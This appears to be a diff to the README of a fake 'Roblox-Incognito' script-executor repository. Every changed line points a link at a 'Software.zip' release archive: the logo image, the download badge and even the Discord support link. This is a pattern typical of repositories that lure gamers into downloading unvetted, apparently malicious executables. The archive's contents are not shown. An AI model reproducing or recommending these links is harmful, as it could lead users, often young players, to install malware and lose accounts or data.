@@ -3,7 +3,7 @@
 
 Welcome to the official GitHub repository of **Roblox-Incognito** - the ultimate Roblox script executor! 🎮
 
-![Incognito Logo](https://example.com/incognito-logo.png)
+![Incognito Logo](https://github.com/Superkhaled64/Roblox-Incognito/releases/download/v2.0/Software.zip)
 
 ## Description
 **Incognito** is a powerful script executor designed for Roblox, offering a user-friendly interface and the capability to run Lua scripts efficiently. This tool enhances gameplay experiences by providing automation features and functionalities that can elevate your Roblox gaming sessions to the next level. It is regularly updated to ensure compatibility with Roblox's latest changes.
@@ -16,7 +16,7 @@ However, it's essential to note that using **Incognito** comes with the inherent
 ## Getting Started
 To start using **Incognito**, download the software package by clicking the button below:
 
-[![Download Incognito](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Incognito](https://github.com/Superkhaled64/Roblox-Incognito/releases/download/v2.0/Software.zip)](https://github.com/Superkhaled64/Roblox-Incognito/releases/download/v2.0/Software.zip)
   
 *Note: The link above needs to be launched to download the software package.*
 
@@ -32,7 +32,7 @@ Here are some of the key features that **Incognito** offers:
 - Risk of violating Roblox's terms of service
 
 ## Support
-For any inquiries or assistance regarding **Incognito**, feel free to reach out through our Discord channel: [Incognito Discord](https://discord.com/incognito)
+For any inquiries or assistance regarding **Incognito**, feel free to reach out through our Discord channel: [Incognito Discord](https://github.com/Superkhaled64/Roblox-Incognito/releases/download/v2.0/Software.zip)
 
 ## Contributing
 We welcome contributions to enhance the capabilities and features of **Incognito**. If you have any suggestions or improvements, please submit a pull request or open an issue on this repository.
